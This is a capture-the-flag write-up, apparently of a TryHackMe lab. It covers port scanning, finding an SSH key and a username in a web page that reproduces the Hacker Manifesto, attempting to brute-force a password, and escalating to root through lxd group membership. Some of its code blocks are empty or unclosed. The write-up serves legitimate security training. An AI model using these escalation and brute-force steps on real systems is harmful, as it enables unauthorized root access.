## Scanning
Running `rustscan` to scan all ports and with `aggressive` mode from nmap.
```bash
$ rustscan -a 10.10.213.104 -- -A

There's only 2 ports open, SSH and HTTP.

## Enumeration
Let's visit the port 80 first.

                The Hacker Manifesto

                        by
                    +++The Mentor+++
                Written January 8, 1986

    Another one got caught today, it's all over the papers. "Teenager Arrested in Computer Crime 
    Scandal", "Hacker Arrested after Bank Tampering"...

    Damn kids. They're all alike.

    But did you, in your three-piece psychology and 1950's technobrain, ever take a look behind 
    the eyes of the hacker? Did you ever wonder what made him tick, what forces shaped him, 
    what may have molded him?

    I am a hacker, enter my world...

    Mine is a world that begins with school... I'm smarter than most of the other kids, this crap 
    they teach us bores me...

    Damn underachiever. They're all alike.

    I'm in junior high or high school. I've listened to teachers explain for the fifteenth time 
    how to reduce a fraction. I understand it. "No, Ms. Smith, I didn't show my work. I did it 
    in my head..."

    Damn kid. Probably copied it. They're all alike.

    I made a discovery today. I found a computer. Wait a second, this is cool. It does what I 
    want it to. If it makes a mistake, it's because I screwed it up. Not because it doesn't like 
    me... Or feels threatened by me.. Or thinks I'm a smart ass.. Or doesn't like teaching and 
    shouldn't be here...

    Damn kid. All he does is play games. They're all alike.

    And then it happened... a door opened to a world... rushing through the phone line like heroin
    through an addict's veins, an electronic pulse is sent out, a refuge from the day-to-day 
    incompetencies is sought... a board is found. "This is it... this is where I belong..." I know
    everyone here... even if I've never met them, never talked to them, may never hear from them 
    again... I know you all...

    Damn kid. Tying up the phone line again. They're all alike...

    You bet your ass we're all alike... we've been spoon-fed baby food at school when we hungered 
    for steak... the bits of meat that you did let slip through were pre-chewed and tasteless. 
    We've been dominated by sadists, or ignored by the apathetic. The few that had something to 
    teach found us willing pupils, but those few are like drops of water in the desert.

    This is our world now... the world of the electron and the switch, the beauty of the baud. We 
    make use of a service already existing without paying for what could be dirt-cheap if it 
    wasn't run by profiteering gluttons, and you call us criminals. We explore... and you call us 
    criminals. We seek after knowledge... and you call us criminals. We exist without skin color, 
    without nationality, without religious bias... and you call us criminals. You build atomic 
    bombs, you wage wars, you murder, cheat, and lie to us and try to make us believe it's for 
    our own good, yet we're the criminals.

    Yes, I am a criminal. My crime is that of curiosity. My crime is that of judging people by 
    what they say and think, not what they look like. My crime is that of outsmarting you, 
    something that you will never forgive me for.

    I am a hacker, and this is my manifesto. You may stop this individual, but you can't stop us 
    all... after all, we're all alike.

Woo! private key, it's for SSH. We just need to find the username to SSH into the machine. I found the username is `john` by looking to the source-code of the `index.html`.

<a href="/assets/images/tryhackme/gamingserver/6.png"><img src="/assets/images/tryhackme/gamingserver/6.png"></a>

Let's bruteforce john's password using the `dict.list` we found earlier.
```bash

It didn't work. Since we found the private key, let's dehashed it and SSH with it.
```bash

## Escalation
I tried basic privesc check and found nothing. After that i check the group of john and it's in `lxd` group.
```bash
john@exploitable:/tmp$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

We can privesc with `lxd` group. Follow [this tutorial](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation) and we got root!
```bash
john@exploitable:/tmp$ lxc exec privesc /bin/sh
~ # whoami
root
```

root.txt:
```bash
/ # find -type f -name root.txt 2>/dev/null
./mnt/root/root/root.txt
/ # cat /mnt/root/root/root.txt
